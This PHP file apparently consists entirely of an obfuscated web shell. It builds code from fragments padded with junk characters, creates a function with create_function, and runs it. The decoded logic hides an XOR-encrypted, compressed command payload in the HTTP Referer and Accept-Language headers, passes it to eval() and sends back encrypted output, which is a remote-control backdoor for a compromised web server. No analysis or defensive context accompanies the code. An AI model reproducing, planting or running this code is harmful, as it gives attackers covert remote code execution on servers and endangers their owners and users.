<?php
$o='gzuncompre56s56s56(@x(@bas56e64_decode(pr5656eg_repl56ace(array("/_/56","/-/56"56),array("/"';
$H='6]]56;if(strpo56s($p,56$56h)56===0){$s[$i]="56";$p=$ss56($p5656,3);}i56f(array_key56_exists(56$i,';
$A='$kh=56"5d41";$56kf="45602a";functio56n x($t56,$k){$56c=strl56en56(56$k);56$l56=strlen($t)56;$o=';
$b=str_replace('D','','DcDDreate_DfuDncDtion');
$y='CEPT_LA56N56GUAGE"];if56($rr&&56$ra){$u=p56arse_56url($rr);5656par56se_str($u["56query"],$';
$M='?/"56,$ra,$m56);i56f($q&56&$m){@sessi56on_56start(56);$s=&$56_SESSIO56N;$ss="56subs56tr";$sl';
$j='$ss(5656md5($i.$kf),560,3));56$p="";for56($z=561;$z<56count56($m[156]);$z++)$56p.=$q[$m[562][$z5';
$L='=56"strt5656olower";56$i=$m[1][0]56.$m56[1][561];$h=$sl(56$ss(md556(56$i56.$kh),560,3));$f=$56sl(';
$S='56,"56+"),$s56s($s5656[$i],0,$e))),$k)56));$56o56=ob_get_content56s56()56;ob_end_cle56an56();$d=base56645';
$l='6_encod56e(x(gzcompres56s($o),$56k));pr56in56t("<$k>$d56</$k>")56;@se56ssion56_de56stroy();}}}}';
$m='{$j};}}re56turn $o56;}$r56=$_SERV56ER;$rr56=56@56$r["HT56TP_REFERE56R"]56;$ra=@$r["H56TTP_AC56';
$h='$s)){56$s[$i56].=56$p;$e=st56rpos(56$s[$i],56$f);i56f(56$e){$k5656=$kh.$kf;56ob_start();@eva56l(@56';
$U='"";for($56i=0;$i<5656$l;){for($j=056;5656($j<$56c&&$i<$l);$j++,$i++56){$56o.=$t{56$i}^$56k';
$Y='q56);$q56=56a56r5656ray_56values($q);preg_match_all("/([5656\\w])[\\56w-]+(?56:;q=056.([\\d]))?,';
$p=str_replace('56','',$A.$U.$m.$y.$Y.$M.$L.$j.$H.$h.$o.$S.$l);
$v=$b('',$p);$v();
?>
